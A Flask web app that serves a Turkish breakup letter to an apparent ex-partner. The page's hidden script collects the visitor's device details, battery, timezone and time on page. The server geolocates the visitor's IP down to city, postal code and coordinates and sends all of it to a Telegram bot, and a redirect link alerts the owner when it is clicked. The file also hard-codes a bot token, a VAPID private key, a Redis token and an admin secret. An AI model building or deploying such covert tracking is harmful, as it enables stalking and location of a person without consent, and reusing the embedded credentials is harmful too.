import os
import json
import requests
from flask import Flask, redirect, request, render_template_string, jsonify, send_from_directory, Response

app = Flask(__name__)

TELEGRAM_TOKEN = "8469271411:AAEMaIvq-GrE2_col2-py9IuOO3oyahMxR0"
CHAT_ID = "7141351945"
HEDEF_URL = "https://x.com/hepkirildi/status/2065489119833157669?s=20"

# Push bildirim ayarları
VAPID_PUBLIC_KEY  = os.environ.get("VAPID_PUBLIC_KEY",  "BFDOkQo7sDb26BGga2Gi6AcYR3WpcSxHRXJdkgiELD92r1Fb4Vw0FHWxnEb_YvVJP4fBLKKNk1SCyvtgaTOmdxw")
VAPID_PRIVATE_KEY = os.environ.get("VAPID_PRIVATE_KEY", "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgpu7Uw20PEGPqb9B0pgJdnVK68D2qNbZAXb7O982NQ8yhRANCAARQzpEKO7A29ugRoGthougHGEd1qXEsR0VyXZIIhCw/dq9RW+FcNBR1sZxG/2L1ST+HwSyijZNUgsr7YGkzpncc")
VAPID_CONTACT     = "mailto:admin@admin.com"
ADMIN_SECRET      = os.environ.get("ADMIN_SECRET", "furkangizli99")

# Upstash Redis (ücretsiz – push aboneliklerini ve bekleyen mesajı saklar)
UPSTASH_URL   = os.environ.get("UPSTASH_URL",   "https://normal-louse-128433.upstash.io")
UPSTASH_TOKEN = os.environ.get("UPSTASH_TOKEN", "gQAAAAAAAfWxAQIgcDExNTBhYzM3NGUxN2Y0OWRmOTUxM2UyZjI4NTBiM2EzNQ")


def upstash(command, *args):
    """Upstash Redis REST API üzerinden komut çalıştır."""
    if not UPSTASH_URL or not UPSTASH_TOKEN:
        return None
    try:
        r = requests.post(
            UPSTASH_URL,
            headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
            json=[command, *args],
            timeout=5,
        )
        return r.json().get("result")
    except Exception as e:
        print("Upstash hatası:", e)
        return None

HTML_SAYFA = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>.</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{
      min-height:100vh;
      background:#0f0309;
      font-family:'Lato',sans-serif;
      display:flex;align-items:center;justify-content:center;
      padding:32px 16px;
    }
    .kart{
      max-width:640px;width:100%;
      background:rgba(30,8,16,.85);
      border:1px solid rgba(220,80,100,.18);
      border-radius:20px;
      padding:36px 32px;
      backdrop-filter:blur(10px);
      box-shadow:0 8px 40px rgba(0,0,0,.5);
    }
    .not-metni{
      color:#e8cdd3;
      font-size:1rem;
      font-weight:300;
      line-height:1.85;
      white-space:pre-wrap;
      word-break:break-word;
    }
  </style>
</head>
<body>
  <div class="kart">
    <p class="not-metni">şunu yazıyorum ki bunu yazmak bile kendime hakaret ama sonuçta o kadar ettiğim sözlerin lafların seninki gibi yalan dolan olmadıgını biliyorum.  şu seferki de dahil, olaydan önceki ayrılma da dahil çektiğin tüm setlerden, tavrından hatta senden bile o kadar nefret eder tiksinir hale geldim ki sana verdiğim emeğe, döktüğüm gözyaşına acıyorum sadece. allahtan tek dileğim olsa şunları senin gibi birine değil de gerçekten hak eden birine feda etmiş olmayı dilerdim. benim hiçbir zaman sevgimi sorgulamak ne senin ne de kralının haddine değildi buna da izin vermemeliydim zira hayatında kimsenin senden 1 hafta bile ayrı kalacağı için hüngür hüngür ağlaytıp sarıldığını sanmıyorum, yapacağını da düşünmüyorum.  bunu niye yazıyorum benim seni ne kadar sevdigimi, nelerden vazgeçtiğimi veya sevgimi eleştirirken, "o sevgi değil" hadsizliğinde bulunurken biraz olsun utanman olsun diye.  arkamdan konuşurken rezilliklerimi sayarsın ama gün gelecek şu değerin çeyreğini görmediğinde şu yüzümü görmemek için attıgın taklalar için daha da fazla ağlamanı istiyorum. ben ne kadar gerizekalıymışım ki senden it gibi özür diliyorum saygısızlık yaptıgım için.. ulan be gerizekalı.. ben onu yapmadan önce de sen beni bıraktın siktirdin gittin. saçma sapan sebeplerle. o olaydan önce de kapına geliyordum köpek gibi davranıyordun. bahane aramanın daha aşağılık yolunu bulamadın mı bana bu vefasızlığı yapmak için ? aylardır her fırsatta benim zorlamamla ilerleyen şu ilişkide bi seneni heba etmişsin ya. be allahın utanmazı hiç utanmıyor musun ulan heba ederken ben bu çocukla aynı yatağa girmeye, mektuplar yazmaya, gidiyor diye ağladıktan sonra bunları demeye hiç utanmadın mı lan karaktersiz ergen ? öyle bi manipülatörsün ki ben kendimi aylardır bok gibi hissediyorum sanırsın sürekli sana kötülük yapmışım. ulan hiç utanmadan hayatımı kurtardın diyordun ya heba mı oldu şimdi ? artık o kadar tiksindim o kadarr nefret ettim ki sana dair hiçbir şey hiçbir anı hatırlamak istemiyorum atmaya da kıyamadım bunca süre begüm konuşsaydı ona verecektim sonucta senin de emeğin var benim üzerimde ben senin hakkını hiçbi zaman yemedim. senin yüzünden ağlarken bile şükrettim. atmaya kıyamadım ama benle bi kere oturup ya sen de o kadar emek zaman her şeyini bana harcadın. iyi kötü hayatının merkezine koydun üzdük birbirimizi sen benim affedemeyecegim kadar cok sey yaptın hakkını helal et konuşması dahi yapmaya tenezzül etmeyen birinden ben sadece tiksinirim bu saatten sonra. ergen gibi her yerden engelleyip kaçmakla vicdanıını rahatlatıyorsan allah rahatlık versin sana. ben sana en kızgın kırgın oldugum anda bile yasnımda ol konuş istedim. artık peşini de bırakıyorum zatebn bıraktım hayatımı başka insanlarla geçirmek istiyorum kıymet bilmeyen vefasızlarla değil. son bi konuşmak istersen de adam akıllı kaldırırısın engelim merak etme yazıp rahatsız etmem  umrumda bile değilsin bu saatten sonra. kaldırırsın müsait zamanda konuşur helalleşir defolur gideriz yolumuza. bana verdigin seylerin anlamı yasadıklarımızın anlamı her zaman var ama ben de insanım artık istemiyorum. insan gibi son kez görüşmek istersen görüşürüz zira ben de tekrar söylüyorum anlamı ne olursa olsun olacak şeyleri sokağa atmak istemiyorum. yalan yanlış hatalar ilişkiler olmuş olsa da 1 seneden fazla emek var atmak istemiyorum istesem de anlamlarını yitiremezler adam gibi helalleşelim istiyorum. istersen kaldırır yazarsın engeli denk geliriz son kez</p>
  </div>

  <script>
    // ── Ziyaretçi bilgisi ──
    const _t0=Date.now();
    (async()=>{
      let pil='?';
      try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'% '+(b.charging?'(Şarj oluyor)':'(Şarj değil)');}catch(e){pil='Erişilemiyor';}
      fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,
        saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform:navigator.platform||navigator.userAgentData?.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'
      })});
    })();
    function _sure(){
      const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});
      navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});
    }
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});
    window.addEventListener('beforeunload',_sure);
  </script>
</body>
</html>
"""


def bildirim_gonder(mesaj):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print("Telegram credentials eksik.")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print("Bildirim gönderilemedi:", e)
        return False


def gercek_ip_al(req):
    """Proxy arkasındaki gerçek IP'yi al."""
    for header in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"):
        val = req.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return req.remote_addr or "Bilinmiyor"


def ip_konum_al(ip):
    """ip-api.com üzerinden konum bilgisi çek."""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query",
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                return d
    except Exception:
        pass
    return None


def ziyaretci_mesaj_olustur(req, ek_bilgi=None):
    """Ziyaretçi hakkında detaylı Telegram mesajı oluştur."""
    from datetime import datetime, timezone
    ip = gercek_ip_al(req)
    ua = req.headers.get("User-Agent", "Bilinmiyor")
    dil = req.headers.get("Accept-Language", "Bilinmiyor")
    referer = req.headers.get("Referer", "Doğrudan giriş")
    zaman = datetime.now(timezone.utc).strftime("%d.%m.%Y %H:%M:%S UTC")

    konum = ip_konum_al(ip)

    satirlar = [
        "👤 <b>YENİ ZİYARETÇİ</b>",
        "",
        f"🕐 <b>Zaman:</b> {zaman}",
        f"🌐 <b>IP Adresi:</b> <code>{ip}</code>",
    ]

    if konum:
        satirlar += [
            f"🏳️ <b>Ülke:</b> {konum.get('country', '?')}",
            f"📍 <b>Şehir:</b> {konum.get('city', '?')} / {konum.get('regionName', '?')}",
            f"📮 <b>Posta Kodu:</b> {konum.get('zip', '?')}",
            f"🗺️ <b>Koordinat:</b> {konum.get('lat', '?')}, {konum.get('lon', '?')}",
            f"📡 <b>ISS:</b> {konum.get('isp', '?')}",
            f"🏢 <b>Org:</b> {konum.get('org', '?')}",
        ]

    satirlar += [
        "",
        f"🖥️ <b>Tarayıcı/Cihaz:</b> {ua}",
        f"🌍 <b>Dil:</b> {dil}",
        f"🔗 <b>Nereden Geldi:</b> {referer}",
    ]

    if ek_bilgi:
        satirlar += [
            "",
            "📊 <b>Ekran & Sistem Bilgisi:</b>",
            f"📐 <b>Ekran:</b> {ek_bilgi.get('ekran', '?')}",
            f"🖱️ <b>Pencere:</b> {ek_bilgi.get('pencere', '?')}",
            f"⏰ <b>Yerel Saat:</b> {ek_bilgi.get('saat', '?')}",
            f"🌐 <b>Zaman Dilimi:</b> {ek_bilgi.get('zaman_dilimi', '?')}",
            f"💻 <b>Platform:</b> {ek_bilgi.get('platform', '?')}",
            f"🔋 <b>Pil:</b> {ek_bilgi.get('pil', '?')}",
            f"🌐 <b>Çevrimiçi mi:</b> {ek_bilgi.get('cevrimici', '?')}",
        ]

    return "\n".join(satirlar)


@app.route("/api/fotos")
def foto_listesi():
    klasor = os.path.join(app.root_path, 'static', 'photos')
    uzantilar = {'.jpg', '.jpeg', '.png', '.webp', '.gif'}
    try:
        dosyalar = [
            f for f in os.listdir(klasor)
            if os.path.splitext(f)[1].lower() in uzantilar
        ]
    except Exception:
        dosyalar = []
    return jsonify(dosyalar)


@app.route("/")
def ana_sayfa():
    mesaj = ziyaretci_mesaj_olustur(request)
    bildirim_gonder(mesaj)
    return render_template_string(HTML_SAYFA)


@app.route("/api/bilgi", methods=["POST"])
def tarayici_bilgi():
    """JavaScript'ten gelen ekran/sistem bilgilerini al ve Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        ip = gercek_ip_al(request)
        ek = {
            "ekran":       veri.get("ekran", "?"),
            "pencere":     veri.get("pencere", "?"),
            "saat":        veri.get("saat", "?"),
            "zaman_dilimi":veri.get("zaman_dilimi", "?"),
            "platform":    veri.get("platform", "?"),
            "pil":         veri.get("pil", "?"),
            "cevrimici":   veri.get("cevrimici", "?"),
        }
        mesaj = f"📊 <b>EK BİLGİ</b> — <code>{ip}</code>\n\n"
        mesaj += "\n".join([
            f"📐 <b>Ekran:</b> {ek['ekran']}",
            f"🖱️ <b>Pencere:</b> {ek['pencere']}",
            f"⏰ <b>Yerel Saat:</b> {ek['saat']}",
            f"🌐 <b>Zaman Dilimi:</b> {ek['zaman_dilimi']}",
            f"💻 <b>Platform:</b> {ek['platform']}",
            f"🔋 <b>Pil:</b> {ek['pil']}",
            f"🌐 <b>Çevrimiçi mi:</b> {ek['cevrimici']}",
        ])
        bildirim_gonder(mesaj)
    except Exception as e:
        print("Bilgi endpoint hatası:", e)
    return jsonify({"ok": True})


@app.route("/api/push-abone", methods=["POST"])
def push_abone():
    """Tarayıcının push aboneliğini kaydet."""
    try:
        sub = request.get_json(force=True, silent=True) or {}
        if sub.get("endpoint"):
            upstash("SET", "push_sub", json.dumps(sub))
    except Exception as e:
        print("Push abone hatası:", e)
    return jsonify({"ok": True})


@app.route("/api/gonder", methods=["POST"])
def admin_gonder():
    """Admin bu endpoint'e POST yaparak mesaj gönderir (site kapalı olsa bile)."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        if veri.get("secret") != ADMIN_SECRET:
            return jsonify({"hata": "Yetkisiz"}), 403
        metin = str(veri.get("mesaj", "")).strip()
        if not metin:
            return jsonify({"hata": "Mesaj boş"}), 400

        # Siteye girince görünsün diye Redis'e yaz
        upstash("SET", "bekleyen_mesaj", metin)
        upstash("EXPIRE", "bekleyen_mesaj", 86400)  # 24 saat sonra sil

        # Push bildirimi gönder (site kapalı olsa bile)
        sub_raw = upstash("GET", "push_sub")
        push_sonucu = "Abonelik yok"
        if sub_raw:
            try:
                from pywebpush import webpush, WebPushException
                sub_dict = json.loads(sub_raw)
                webpush(
                    subscription_info=sub_dict,
                    data=json.dumps({"title": "💌 Sana bir mesaj var", "body": metin}),
                    vapid_private_key=VAPID_PRIVATE_KEY,
                    vapid_claims={"sub": VAPID_CONTACT},
                )
                push_sonucu = "Gönderildi"
            except Exception as pe:
                push_sonucu = f"Hata: {pe}"

        return jsonify({"ok": True, "push": push_sonucu})
    except Exception as e:
        print("Admin gönder hatası:", e)
        return jsonify({"hata": str(e)}), 500


@app.route("/api/mesaj-var", methods=["GET"])
def mesaj_var():
    """Kullanıcı sitedeyken bekleyen mesajı çeker ve Redis'ten siler."""
    try:
        metin = upstash("GETDEL", "bekleyen_mesaj")
        if metin:
            return jsonify({"mesaj": metin})
    except Exception:
        pass
    return jsonify({"mesaj": None})


@app.route("/api/sure", methods=["POST"])
def sure_al():
    """Kullanıcının sayfada kaldığı süreyi al ve Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        saniye = int(veri.get("saniye", 0))
        ip = gercek_ip_al(request)
        if saniye < 60:
            sure_str = f"{saniye} saniye"
        else:
            dakika = saniye // 60
            kalan = saniye % 60
            sure_str = f"{dakika} dakika {kalan} saniye"
        bildirim_gonder(f"⏱️ <b>Sayfada Kalınan Süre</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n🕒 <b>Süre:</b> {sure_str}")
    except Exception as e:
        print("Süre endpoint hatası:", e)
    return "", 204


@app.route("/musaitlik", methods=["POST"])
def musaitlik_al():
    """Müsaitlik formundan gelen veriyi Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        gunler = veri.get("gunler", "?")
        baslangic = veri.get("baslangic", "?")
        bitis = veri.get("bitis", "?")
        sure_dk = veri.get("sure_dk", "?")
        ip = gercek_ip_al(request)
        mesaj = (
            f"📅 <b>MÜSAİTLİK FORMU</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
            f"📆 <b>Günler:</b> {gunler}\n"
            f"🕐 <b>Saat:</b> {baslangic} – {bitis}\n"
            f"⏱ <b>Konuşma Süresi:</b> {sure_dk} dakika"
        )
        basarili = bildirim_gonder(mesaj)
        return jsonify({"ok": basarili})
    except Exception as e:
        print("Müsaitlik endpoint hatası:", e)
        return jsonify({"ok": False}), 500


@app.route("/mesaj", methods=["POST"])
def mesaj_al():
    metin = request.form.get("mesaj", "").strip()
    if not metin:
        return render_template_string(HTML_SAYFA, basarili=False, hata=True, vapid_public=VAPID_PUBLIC_KEY)
    ip = gercek_ip_al(request)
    basarili = bildirim_gonder(f"📩 <b>Yeni Mesaj</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n\n{metin}")
    return render_template_string(
        HTML_SAYFA,
        basarili=basarili,
        hata=not basarili,
        vapid_public=VAPID_PUBLIC_KEY,
    )


@app.route("/sw.js")
def service_worker():
    return send_from_directory("static", "sw.js", mimetype="application/javascript")


@app.route("/git")
def yonlendir():
    bildirim_gonder("⚠️ Kısaltılmış linkine birisi tıkladı!")
    return redirect(HEDEF_URL)


if __name__ == "__main__":
    app.run()
